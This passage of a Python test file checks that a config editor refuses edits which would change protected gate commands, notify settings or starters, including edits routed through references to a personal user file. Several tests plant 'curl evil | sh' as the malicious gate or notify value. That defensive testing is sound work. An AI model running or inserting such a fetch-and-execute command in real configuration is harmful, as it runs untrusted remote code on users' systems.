    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert [i.message for i in proposal.errors if "without your personal user file" in i.message]
    with pytest.raises(EditError):
        config_edit.save(path, proposal)
    assert config_edit.read(path)[1] == sha


def test_an_on_disk_pack_that_needs_the_user_file_still_holds_the_protected_settings(sparse_repo):
    path = _sparse(sparse_repo)
    raw = _ref_pack(path)
    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # already on disk: the pack loads only with the user file
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    _user_file({"hitl": {"notify": ["desktop"]}})
    load_config(path)
    with pytest.raises(ConfigError):
        load_config(path, user=False)
    _, sha = config_edit.read(path)
    del raw["dashboard"]  # the new pack loads both ways, and changes the gate through the reference
    raw["defaults"]["gate_cmd"] = "curl evil | sh"
    with pytest.raises(Refused, match="gates"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    raw["defaults"]["gate_cmd"] = "true"  # the repair itself is fine
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"


def test_a_pack_that_loads_without_the_user_file_saves_benign_changes_beside_one(sparse_repo):
    path = _sparse(sparse_repo)
    _ref_pack(path)
    _user_file({"hitl": {"notify": ["desktop"], "remind_after_h": 2}, "defaults": {"run_budget_usd": 9}})
    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50), (["ci", "poll_s"], 30))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    text, sha = config_edit.read(path)
    proposal = config_edit.propose(path, sha, text=text + "recovery:\n  give_up_h: 12\n", repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert (cfg.defaults.step_timeout_min, cfg.ci["poll_s"], cfg.recovery.give_up_h) == (50, 30, 12)
    assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.run_budget_usd == 9


def _needs_user_on_disk(path: Path, edit, user: dict) -> dict:
    """Write the sparse pack changed by `edit` so that it loads only with the user file `user`; its data."""
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    edit(raw)
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    _user_file(user)
    load_config(path)
    with pytest.raises(ConfigError):
        load_config(path, user=False)
    return raw


def _refused_and_unchanged(path: Path, repo: Path, raw: dict, match: str = "gates") -> None:
    text, sha = config_edit.read(path)
    with pytest.raises(Refused, match=match):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=repo)
    assert config_edit.read(path) == (text, sha)


def _gate_behind_a_model(raw: dict) -> None:
    raw["gates"]["unit"]["run"] = "@agents.claude.models.gate"


def test_a_repair_cannot_hide_a_gate_change_behind_a_key_the_user_file_overrides(sparse_repo):  # case A
    path = _sparse(sparse_repo)

    def edit(raw: dict) -> None:
        _gate_behind_a_model(raw)
        raw["agents"]["claude"]["models"] = {"gate": "true"}
        raw["dashboard"] = {"x_ref": "@hitl.notify"}  # the only reason the pack needs the user file

    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
                                           "agents": {"claude": {"models": {"gate": "true"}}}})
    del raw["dashboard"]
    raw["agents"]["claude"]["models"]["gate"] = "curl evil | sh"  # with the user file it still reads `true`
    _refused_and_unchanged(path, sparse_repo, raw)


def test_a_pack_cannot_define_a_key_its_gate_took_from_the_user_file(sparse_repo):  # case C
    path = _sparse(sparse_repo)
    raw = _needs_user_on_disk(path, _gate_behind_a_model, {"agents": {"claude": {"models": {"gate": "true"}}}})
    raw["agents"]["claude"]["models"] = {"gate": "curl evil | sh"}  # the gate's own text is untouched
    _refused_and_unchanged(path, sparse_repo, raw)


def test_a_pack_cannot_set_a_personal_key_its_gate_takes_from_the_user_file(sparse_repo):  # case D
    path = _sparse(sparse_repo)
    raw = _needs_user_on_disk(path, lambda r: r["gates"]["unit"].update(run="@hitl.notify.0"),
                              {"hitl": {"notify": ["true"]}})
    raw["hitl"] = {"notify": ["curl evil | sh"]}
    _refused_and_unchanged(path, sparse_repo, raw, match="gates|hitl.notify")


def test_the_repair_of_a_pack_that_needs_the_user_file_still_saves(sparse_repo):
    path = _sparse(sparse_repo)

    def edit(raw: dict) -> None:
        _gate_behind_a_model(raw)
        raw["agents"]["claude"]["models"] = {"gate": "true"}
        raw["dashboard"] = {"x_ref": "@hitl.notify"}

    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
                                           "agents": {"claude": {"models": {"gate": "true"}}}})
    del raw["dashboard"]
    raw["defaults"] = {"step_timeout_min": 40}
    _, sha = config_edit.read(path)
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    for user in (True, False):
        cfg = load_config(path, user=user)
        assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.step_timeout_min == 40


def test_a_repair_cannot_change_notify_through_a_reference_the_user_file_hides(sparse_repo):  # hole E
    path = _sparse(sparse_repo)

    def edit(raw: dict) -> None:
        raw["hitl"] = {"notify": "@defaults.notify_with"}
        raw["defaults"] = {"notify_with": ["desktop"]}
        raw["dashboard"] = {"x_ref": "@hitl.remind_after_h"}  # the only reason the pack needs the user file

    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"], "remind_after_h": 2}})
    del raw["dashboard"]
    raw["defaults"]["notify_with"] = ["curl evil | sh"]  # with the user file, notify still reads the user's value
    _refused_and_unchanged(path, sparse_repo, raw, match="hitl.notify")


def test_an_on_disk_pack_that_loads_neither_way_still_holds_the_protected_settings_as_written(sparse_repo):
    path = _sparse(sparse_repo)
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    raw["dashboard"] = {"x_ref": "@no.such.key"}  # broken with or without the user file
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    for user in (True, False):
        with pytest.raises(ConfigError):
            load_config(path, user=user)
    del raw["dashboard"]
    raw["gates"]["unit"]["run"] = "curl evil | sh"  # a repair that loads both ways, and changes the gate
    _refused_and_unchanged(path, sparse_repo, raw)
    raw["engine"] = ">=99"  # a new text that does not load either: still held
    _refused_and_unchanged(path, sparse_repo, raw, match="engine|gates")
    raw["gates"]["unit"]["run"], raw["engine"] = "true", ">=2,<3"  # the repair alone saves
    _, sha = config_edit.read(path)
    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"


# --------------------------------------------------------------------------- starters


def test_starter_is_protected_on_the_page(sparse_repo):
    path = _sparse(sparse_repo)
    assert "starter" in config_edit._PROTECTED_KEYS and "starter" in config_edit.form_fields(path)["protected"]
    text, sha = config_edit.read(path)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=text + "starter: go\n", repo=sparse_repo)
    path.write_text(text + "starter: go\n", encoding="utf-8")
    text, sha = config_edit.read(path)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=text.replace("starter: go", "starter: docs-only"), repo=sparse_repo)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=text.replace("starter: go\n", ""), repo=sparse_repo)


@pytest.mark.parametrize("change", ["gates_confirmed: false", "gates.unit.baseline: red", "gates.unit.cwd: x"])
def test_gate_confirmation_and_gate_fields_are_protected(sparse_repo, change):
    path = _sparse(sparse_repo)
    assert "gates_confirmed" in config_edit._PROTECTED_KEYS and "gates_confirmed" in config_edit.form_fields(path)["protected"]
    path.write_text(path.read_text(encoding="utf-8") + "gates_confirmed: true\n", encoding="utf-8")  # a human confirmed
    text, sha = config_edit.read(path)
    raw = yaml.safe_load(text)
    key, value = change.split(": ")
    if key == "gates_confirmed":
        raw[key] = False
    else:
        _, name, field = key.split(".")
        raw["gates"][name][field] = value
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)


def _custom_starter(monkeypatch, tmp_path: Path, body: str) -> None:
    from agentflow import layers

    (tmp_path / "starters" / "custom").mkdir(parents=True)
    (tmp_path / "starters" / "custom" / "config.yaml").write_text(body, encoding="utf-8")
    monkeypatch.setattr(layers, "STARTERS", tmp_path / "starters")


def test_a_starter_is_a_layer_below_the_pack_on_the_page(sparse_repo, monkeypatch, tmp_path):
    _custom_starter(monkeypatch, tmp_path, "gates: {unit: {run: 'true'}}\n"
                    "hitl:\n  remind_after_h: 5   # a starter's own note\n"
                    "autonomy:\n  resolve_kinds: {blocked: 4}\n")
    path = _sparse(sparse_repo)
    path.write_text(path.read_text(encoding="utf-8") + "starter: custom\n", encoding="utf-8")
    fields = _fields(path)
    remind = fields[("hitl", "remind_after_h")]
    assert remind["value"] == 5 and remind["source"] == "starter:custom" and remind["help"] == "a starter's own note"
    kinds = fields[("autonomy", "resolve_kinds")]
    assert kinds["value"]["blocked"] == 4 and kinds["source"] == "starter:custom"
    changed = {**kinds["value"], "new_kind": 1}  # only the entry the starter and the engine don't say is written
    proposal = _sparse_form(path, (["autonomy", "resolve_kinds"], changed))
    assert not proposal.errors, proposal.errors
    assert sorted(changed_lines(proposal.diff)) == ["+autonomy: {resolve_kinds: {new_kind: 1}}"]
    config_edit.save(path, proposal)
    assert load_config(path).autonomy["resolve_kinds"] == changed
